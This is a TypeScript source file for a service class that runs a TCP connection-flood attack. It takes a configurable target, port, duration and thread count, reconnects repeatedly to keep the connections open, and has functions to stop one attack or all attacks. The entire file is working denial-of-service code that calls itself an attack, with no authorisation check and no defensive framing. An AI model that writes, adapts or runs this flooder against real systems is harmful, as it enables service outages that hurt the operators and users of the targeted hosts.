import { createConnection } from 'net';
import { AttackConfig } from '../../types';
import { logger } from '../../utils/logger';

export class TcpFloodService {
  private activeAttacks: Map<string, Set<any>> = new Map();

  async start(config: AttackConfig): Promise<void> {
    const { target, port = 80, duration, threads } = config;
    const attackId = `${target}:${port}-${Date.now()}`;
    const connections = new Set();

    logger.info(`Starting TCP flood attack on ${target}:${port} with ${threads} threads for ${duration}s`);

    const startTime = Date.now();
    const endTime = startTime + duration * 1000;

    for (let i = 0; i < threads; i++) {
      const connect = () => {
        if (Date.now() >= endTime) {
          return;
        }

        try {
          const socket = createConnection(port, target, () => {
            connections.add(socket);
          });

          socket.on('error', () => {
            connections.delete(socket);
            if (Date.now() < endTime) {
              setTimeout(connect, 100);
            }
          });

          socket.on('close', () => {
            connections.delete(socket);
            if (Date.now() < endTime) {
              setTimeout(connect, 100);
            }
          });
        } catch (error) {
        }
      };

      connect();
    }

    this.activeAttacks.set(attackId, connections);

    setTimeout(() => {
      this.stop(attackId);
    }, duration * 1000);
  }

  stop(attackId: string): void {
    const connections = this.activeAttacks.get(attackId);
    if (connections) {
      connections.forEach((socket) => {
        try {
          socket.destroy();
        } catch {
        }
      });
      this.activeAttacks.delete(attackId);
      logger.info(`Stopped attack: ${attackId}`);
    }
  }

  stopAll(): void {
    this.activeAttacks.forEach((connections) => {
      connections.forEach((socket) => {
        try {
          socket.destroy();
        } catch {
        }
      });
    });
    this.activeAttacks.clear();
    logger.info('All TCP attacks stopped');
  }
}

export const tcpFloodService = new TcpFloodService();

